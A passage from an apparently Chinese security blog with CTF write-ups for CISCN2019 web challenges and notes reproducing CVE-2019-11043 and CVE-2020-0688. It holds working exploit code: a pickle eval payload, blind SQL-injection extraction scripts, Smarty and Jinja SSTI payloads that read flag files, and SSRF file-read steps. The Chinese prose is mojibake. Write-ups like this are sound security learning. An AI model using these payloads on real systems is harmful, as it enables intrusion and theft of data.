<p><img src="/.com//17.png" alt="image-20200311125000205"></p>
<p><img src="/.com//16.png" alt="image-20200311124908966"></p>
<p>ä¸Šé¢çš„JWTçˆ†ç ´ä¸€ä¸‹ï¼Œè·å¾—ç§˜é’¥ã€‚</p>
<p><img src="/.com//C:%5CUsers%5Ccookie%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200311123330551.png" alt="image-20200311123330551"></p>
<p>ç„¶åä¿®æ”¹ä¸€ä¸‹è¿™ä¸ªJWT</p>
<p><img src="/.com//18.png" alt="image-20200311125112647"></p>
<p>æŠ“åŒ…ï¼Œæ”¹JWTï¼Œç„¶ååˆ°è¿™ä¸ªé¡µé¢ã€‚</p>
<p><img src="/.com//19.png" alt="image-20200311125235395"></p>
<p>åœ¨æºç ä¸­å‘ç°ä¿¡æ¯</p>
<p><img src="/.com//20.png" alt="image-20200311125503858"></p>
<p>ä¸‹è½½æºç </p>
<p><img src="/.com//21.png" alt="image-20200311125626537"></p>
<p>ååºåˆ—åŒ–çš„å†…å®¹å‚è€ƒ:<a href="https://blog.csdn.net/qq_26406447/article/details/91964502" target="_blank" rel="noopener">https://blog.csdn.net/qq_26406447/article/details/91964502</a></p>
<p>è¿è¡Œï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">       <span class="keyword">return</span> (eval, (<span class="string">"open('/flag.txt','r').read()"</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="keyword">print</span> a</span><br></pre></td></tr></table></figure>

<p><img src="/.com//22.png" alt="image-20200311130133493"></p>
<h2 id="CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb"><a href="#CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb"></a>[CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb</h2><p>è€ƒå¯Ÿï¼šphpçŸ­æ ‡ç­¾ï¼Œsqlæ³¨å…¥ï¼Œæ–‡ä»¶æ³„éœ²</p>
<p>å­˜åœ¨robots.txtï¼Œé‡Œé¢æç¤ºæœ‰<code>php.bak</code>ï¼Œå°è¯•åå‘ç°<code>image.php.bak</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line">$id=<span class="keyword">isset</span>($_GET[<span class="string">"id"</span>])?$_GET[<span class="string">"id"</span>]:<span class="string">"1"</span>;</span><br><span class="line">$path=<span class="keyword">isset</span>($_GET[<span class="string">"path"</span>])?$_GET[<span class="string">"path"</span>]:<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">$id=addslashes($id);</span><br><span class="line">$path=addslashes($path);</span><br><span class="line"></span><br><span class="line">$id=str_replace(<span class="keyword">array</span>(<span class="string">"\\0"</span>,<span class="string">"%00"</span>,<span class="string">"\\'"</span>,<span class="string">"'"</span>),<span class="string">""</span>,$id);</span><br><span class="line">$path=str_replace(<span class="keyword">array</span>(<span class="string">"\\0"</span>,<span class="string">"%00"</span>,<span class="string">"\\'"</span>,<span class="string">"'"</span>),<span class="string">""</span>,$path);</span><br><span class="line"></span><br><span class="line">$result=mysqli_query($con,<span class="string">"select * from images where id='&#123;$id&#125;' or path='&#123;$path&#125;'"</span>);</span><br><span class="line">select * from images where id = <span class="string">'\\\0'</span> <span class="keyword">or</span> path = <span class="string">''</span></span><br><span class="line">$row=mysqli_fetch_array($result,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line">$path=<span class="string">"./"</span> . $row[<span class="string">"path"</span>];</span><br><span class="line">header(<span class="string">"Content-Type: image/jpeg"</span>);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></table></figure>

<p>å…³é”®ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$id=addslashes($id);</span><br><span class="line">$path=addslashes($path);</span><br><span class="line"></span><br><span class="line">$id=str_replace(<span class="keyword">array</span>(<span class="string">"\\0"</span>,<span class="string">"%00"</span>,<span class="string">"\\'"</span>,<span class="string">"'"</span>),<span class="string">""</span>,$id);</span><br><span class="line">$path=str_replace(<span class="keyword">array</span>(<span class="string">"\\0"</span>,<span class="string">"%00"</span>,<span class="string">"\\'"</span>,<span class="string">"'"</span>),<span class="string">""</span>,$path);</span><br></pre></td></tr></table></figure>

<p>ç„¶åæ ¹æ®</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result=mysqli_query($con,<span class="string">"select * from images where id='&#123;$id&#125;' or path='&#123;$path&#125;'"</span>);</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯ä»¥æ„é€ å¦‚ä¸‹:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from images where id&#x3D;&#39;\&#39; or path&#x3D;&#39; or 1&#x3D;1 #&#39;</span><br></pre></td></tr></table></figure>

<p>ç„¶åæ„é€ payloadï¼š</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=\0'&amp;path = or 1=1%23</span><br></pre></td></tr></table></figure>

<p><img src="/.com//23.png" alt="image-20200311175856463"></p>
<p>ç¼–å†™exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://9de73950-2d86-4eec-b3bc-3f2c64462a53.node3.buuoj.cn/image.php?id=\\0&amp;path="</span></span><br><span class="line">payload = <span class="string">"or id=if(ascii(substr((select password from users),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)%23"</span></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    l = <span class="number">1</span></span><br><span class="line">    r = <span class="number">130</span></span><br><span class="line">    mid = (l + r)&gt;&gt;<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(l&lt;r):</span><br><span class="line">        payloads = payload.format(i,mid)</span><br><span class="line">        print(url+payloads)</span><br><span class="line">        html = requests.get(url+payloads)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"JFIF"</span> <span class="keyword">in</span> html.text:</span><br><span class="line">            l = mid +<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = mid</span><br><span class="line">        mid = (l + r)&gt;&gt;<span class="number">1</span></span><br><span class="line">    result+=chr(mid)</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>

<p>username:admin</p>
<p>password:ec1e34b7ba2d156e13c7</p>
<p>å› ä¸ºä¸å…è®¸ä¸Šä¼ å¸¦phpçš„æ–‡ä»¶åï¼Œæˆ‘ä»¬ç”¨phpçŸ­æ ‡ç­¾æ¥ç»•è¿‡<br><img src="/.com//24.png" alt="image-20200311181845820"></p>
<p>ç„¶åè¿æ¥antswordè·å¾—flag</p>
<h2 id="CISCN2019-åä¸œå—èµ›åŒº-Web11"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Web11" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Web11"></a>[CISCN2019 åä¸œå—èµ›åŒº]Web11</h2><p>è€ƒå¯Ÿï¼šsmarty-ssti</p>
<p><img src="/.com//25.png" alt="image-20200311235103852"></p>
<p>è¿™é‡Œçš„IPæç¤ºæˆ‘ä»¬ä¿®æ”¹<code>X-Forwarded-For</code></p>
<p><img src="/.com//26.png" alt="image-20200311235352922"></p>
<p>è¿™é‡Œå­˜åœ¨SSTI</p>
<p>ç„¶åæç¤ºæœ‰è¯´åˆ°è¿™æ˜¯<code>smarty</code>æ¨¡å—ï¼Œæ‰€ä»¥æŸ¥çœ‹ç‰ˆæœ¬</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;smarty.version&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/.com//27.png" alt="image-20200312000018328"></p>
<p>ç‰ˆæœ¬æ˜¯<code>3.1.30</code></p>
<p>ç„¶åè¿™ä¸ªç‰ˆæœ¬å­˜åœ¨æ¼æ´ï¼Œ<code>{if }{/if}</code>å¯ä»¥æ‰§è¡Œphpä»£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="keyword">if</span> readfile(<span class="string">'/flag'</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br></pre></td></tr></table></figure>

<p>è·å¾—flag</p>
<p><img src="/.com//28.png" alt="image-20200312000503140"></p>
<h2 id="CISCN2019-åä¸œå—èµ›åŒº-Double-Secret"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Double-Secret" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Double Secret"></a>[CISCN2019 åä¸œå—èµ›åŒº]Double Secret</h2><p>è€ƒç‚¹ï¼šSSTI</p>
<p>éšä¾¿è¾“ç‚¹ä¸œè¥¿ï¼Œå‡ºç°æŠ¥é”™ï¼Œè€ƒè™‘åˆ°å¯èƒ½æœ‰SSTI.</p>
<p>é¡ºå¸¦çˆ†å‡ºæºç </p>
<p><img src="/.com//29.png" alt="image-20200312105637667"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">secret=request.args.get(<span class="string">'secret'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(secret==<span class="literal">None</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Tell me your secret.I will encrypt it so others can\'t see'</span></span><br><span class="line"></span><br><span class="line">rc=rc4_Modified.RC4(<span class="string">"HereIsTreasure"</span>)   <span class="comment">#è§£å¯†</span></span><br><span class="line"></span><br><span class="line">deS=rc.do_crypt(secret)</span><br><span class="line"></span><br><span class="line">a=render_template_string(safe(deS))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> <span class="string">'ciscn'</span> <span class="keyword">in</span> a.lower():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'flag detected!'</span></span><br></pre></td></tr></table></figure>

<p><a href="https://www.cnblogs.com/nongchaoer/p/12431229.html" target="_blank" rel="noopener">https://www.cnblogs.com/nongchaoer/p/12431229.html</a></p>
<p><code>render_template_string</code>å¯¹æ¸²æŸ“å‡½æ•°å¯ä»¥è§¦å‘SSTI</p>
<p>æ³¨å…¥çš„å†…å®¹æ˜¯payloadç»è¿‡åŠ å¯†çš„ç»“æœ</p>
<p>expå¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RC4</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, key)</span>:</span></span><br><span class="line">        self.key = key</span><br><span class="line">        self.key_length = len(key)</span><br><span class="line">        self._init_S_box()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_init_S_box</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.Box = [i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>)]</span><br><span class="line">        k = [self.key[i % self.key_length] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>)]</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            j = (j + self.Box[i] + ord(k[i])) % <span class="number">256</span></span><br><span class="line">            self.Box[i], self.Box[j] = self.Box[j], self.Box[i]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">crypt</span><span class="params">(self, plaintext)</span>:</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        result = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> plaintext:</span><br><span class="line">            i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">            j = (j + self.Box[i]) % <span class="number">256</span></span><br><span class="line">            self.Box[i], self.Box[j] = self.Box[j], self.Box[i]</span><br><span class="line">            t = (self.Box[i] + self.Box[j]) % <span class="number">256</span></span><br><span class="line">            result += chr(self.Box[t] ^ ord(ch))</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://879dd696-7b30-4746-99a0-c12f8ed23937.node3.buuoj.cn/secret?secret='</span></span><br><span class="line">a = RC4(<span class="string">'HereIsTreasure'</span>)</span><br><span class="line">cmd=<span class="string">"&#123;&#123;''.__class__.__mro__[2].__subclasses__()[40]('/flag.txt').read()&#125;&#125;"</span></span><br><span class="line">payload = urllib.parse.quote(a.crypt(cmd))</span><br><span class="line">res = requests.get(url + payload)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>





<h2 id="CISCN2019-åä¸œå—èµ›åŒº-Web4"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Web4" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Web4"></a>[CISCN2019 åä¸œå—èµ›åŒº]Web4</h2><p><img src="/.com//31.png" alt="image-20200312145428750"></p>
<p>ç„¶åæˆ‘ä»¬<code>Read somethings</code>ï¼Œç„¶åè¿™é‡Œçš„urlå¦‚ä¸‹ï¼š</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219b4ebc-7e98-44b9-bad5-bd300c115f88.node3.buuoj.cn/read?url=http://xxxxx</span><br></pre></td></tr></table></figure>



<p>è¿™é‡Œå­˜åœ¨æ–‡ä»¶è¯»å–æ¼æ´</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web55.buuoj.cn/read?url=app.py è¯»æºç </span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> re, random, uuid, urllib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*<span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    session[<span class="string">'username'</span>] = <span class="string">'www-data'</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hello World! &lt;a href="/read?url=https://baidu.com"&gt;Read somethings&lt;/a&gt;'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/read')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">'url'</span>)</span><br><span class="line">        m = re.findall(<span class="string">'^file.*'</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">'flag'</span>, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m <span class="keyword">or</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'No Hack'</span></span><br><span class="line">        res = urllib.urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="keyword">print</span> str(ex)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'no response'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/flag')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">and</span> session[<span class="string">'username'</span>] == <span class="string">'fuck'</span>:</span><br><span class="line">        <span class="keyword">return</span> open(<span class="string">'/flag.txt'</span>).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Access denied'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">True</span>,</span><br><span class="line">        host=<span class="string">"0.0.0.0"</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure>

<p>è§£é‡Šä¸€ä¸‹ï¼š<code>/flag</code>è¯»flagçš„æ–¹æ³•æ˜¯è¦<code>session[&#39;username&#39;] == &#39;fuck&#39;</code></p>
<p>å…³é”®ä»£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*<span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªéšæœºæ•°çš„ç§å­æ˜¯æœºå™¨çš„<code>macåœ°å€</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=/sys/class/net/eth0/address</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">02</span>:<span class="number">42</span>:ae:<span class="number">01</span>:<span class="number">03</span>:b5</span><br></pre></td></tr></table></figure>

<p>exp:<a href="https://github.com/glzjin/CISCN_2019_southeastern_China_web4/tree/master/exp" target="_blank" rel="noopener">https://github.com/glzjin/CISCN_2019_southeastern_China_web4/tree/master/exp</a></p>
<p>ç”¨äºç ´è§£éšæœºæ•°ï¼Œç”Ÿæˆæ–°çš„session</p>
<p>è®¿é—®<code>/flag</code>ï¼Œæ›¿æ¢åŸæœ‰sessionï¼Œè·å¾—flag</p>
<p><img src="/.com//31.png" alt="image-20200312145428750"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/03/13/CISCN2019-web-%E5%A4%8D%E7%8E%B0/" data-id="ck8sqr5ha0001kou566b18d26" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-CVE-2019-11043" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/03/09/CVE-2019-11043/" class="article-date">
  <time datetime="2020-03-09T02:46:55.000Z" itemprop="datePublished">2020-03-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/03/09/CVE-2019-11043/">CVE-2019-11043</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="CVE-2019-11043"><a href="#CVE-2019-11043" class="headerlink" title="CVE-2019-11043"></a>CVE-2019-11043</h1><p>CVE-2019-11043å¤ç°</p>
<h1 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h1><p>ç›´æ¥ä½¿ç”¨BUUOJä¸Šçš„ç¯å¢ƒ</p>
<p>è¿™é‡Œæœ‰å…³äº<code>php-fpm</code>çš„ç®€ä»‹ç­‰ï¼Œæœ‰åŠ©äºç†è§£è¿™ä¸ªæ¼æ´</p>
<p><a href="https://www.jianshu.com/p/99d478ea1330" target="_blank" rel="noopener">https://www.jianshu.com/p/99d478ea1330</a></p>
<p>å½“<code>Nginx</code>ä¸­å¦‚ä¸‹ä»£ç æ—¶ï¼Œå¯èƒ½å­˜åœ¨è¯¥æ¼æ´</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> location ~ [^/]\.php(/|$) &#123;</span><br><span class="line"></span><br><span class="line">    fastcgi_split_path_info ^(.+?\.php)(/.*)$;</span><br><span class="line"></span><br><span class="line">    fastcgi_param PATH_INFO       $fastcgi_path_info;</span><br><span class="line"></span><br><span class="line">    fastcgi_pass   php:<span class="number">9000</span>;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…³äºæ¼æ´åˆ†æå‚è€ƒï¼š</p>
<p><a href="https://www.freebuf.com/vuls/218132.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/218132.html</a></p>
<p>éœ€è¦æœ‰golangçš„ç¯å¢ƒ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install golang -y</span><br></pre></td></tr></table></figure>



<p>githubä¸Šä¸‹è½½expï¼Œè¿™ä¸ªexpä»…é€‚ç”¨php7çš„ç‰ˆæœ¬</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> https:<span class="comment">//github.com/neex/phuip-fpizdam.git</span></span><br><span class="line">cd phuip-fpizdam</span><br><span class="line">go build</span><br></pre></td></tr></table></figure>

<p><img src="/.com//3.png" alt="image-20200328225005790"></p>
<p>å‚è€ƒï¼š<a href="https://www.freebuf.com/vuls/218132.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/218132.html</a></p>
<p>æ‰§è¡Œå‘½ä»¤</p>
<p><img src="/.com//1.png" alt="image-20200328224623378"></p>
<p>æ‰§è¡ŒæˆåŠŸ</p>
<p><img src="/.com//2.png" alt="image-20200328224822292"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/03/09/CVE-2019-11043/" data-id="ck8sqr5hf0003kou5ebme2tmn" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-CVE-2020-0688" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/03/08/CVE-2020-0688/" class="article-date">
  <time datetime="2020-03-08T02:50:04.000Z" itemprop="datePublished">2020-03-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/03/08/CVE-2020-0688/">CVE-2020-0688</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="CVE-2020-0688"><a href="#CVE-2020-0688" class="headerlink" title="CVE-2020-0688"></a>CVE-2020-0688</h1><p>CVE-2020-0688å¤ç°</p>
<h1 id="å¤ç°è¿‡ç¨‹"><a href="#å¤ç°è¿‡ç¨‹" class="headerlink" title="å¤ç°è¿‡ç¨‹"></a>å¤ç°è¿‡ç¨‹</h1><p>æ¼æ´æè¿°ï¼šæ”»å‡»è€…å‘å­˜åœ¨ç¼ºé™·çš„ExchangeæœåŠ¡å™¨å‘é€ç»è¿‡ç‰¹æ®Šå¤„ç†çš„ç”µå­é‚®ä»¶å³å¯è§¦å‘æ¼æ´ã€‚è¿™ä¸ªæ¼æ´æ˜¯ç”±äºExchangeæœåŠ¡å™¨åœ¨å®‰è£…æ—¶æ²¡æœ‰æ­£ç¡®åœ°åˆ›å»ºå”¯ä¸€çš„åŠ å¯†å¯†é’¥æ‰€é€ æˆçš„ã€‚</p>
<p>å…·ä½“æè¿°ï¼šä¸æ¯æ¬¡è½¯ä»¶å®‰è£…éƒ½ä¼šäº§ç”Ÿéšæœºå¯†é’¥ä¸åŒï¼Œæ‰€æœ‰Exchange Serveråœ¨å®‰è£…åçš„web.configæ–‡ä»¶ä¸­éƒ½æ‹¥æœ‰<strong>ç›¸åŒçš„validationKeyå’ŒdecryptionKey</strong>ã€‚è¿™äº›å¯†é’¥ç”¨äºä¿è¯ViewStateçš„å®‰å…¨æ€§ã€‚è€ŒViewStateæ˜¯ASP.NET Webåº”ç”¨ä»¥åºåˆ—åŒ–æ ¼å¼å­˜å‚¨åœ¨å®¢æˆ·æœºä¸Šçš„æœåŠ¡ç«¯æ•°æ®ã€‚å®¢æˆ·ç«¯é€šè¿‡__VIEWSTATEè¯·æ±‚å‚æ•°å°†è¿™äº›æ•°æ®è¿”å›ç»™æœåŠ¡å™¨ã€‚æ”»å‡»è€…å¯ä»¥åœ¨Exchange Control Panel webåº”ç”¨ä¸Šæ‰§è¡Œä»»æ„.netä»£ç ã€‚</p>
<p>å½±å“ç‰ˆæœ¬ï¼šexchange 2010ã€2013ã€2016ã€2019å…¨ç‰ˆæœ¬é€šæ€ã€‚</p>
<p>æ¼æ´å¤ç°ï¼š</p>
<p>è¿™æ¬¡æ¼æ´å¤ç°ç›´æ¥å€Ÿç”±<code>BJDCTF-2nd</code>çš„<code>EasyAspDotNet</code></p>
<p><img src="/.com//1.png" alt="image-20200328145516996"></p>
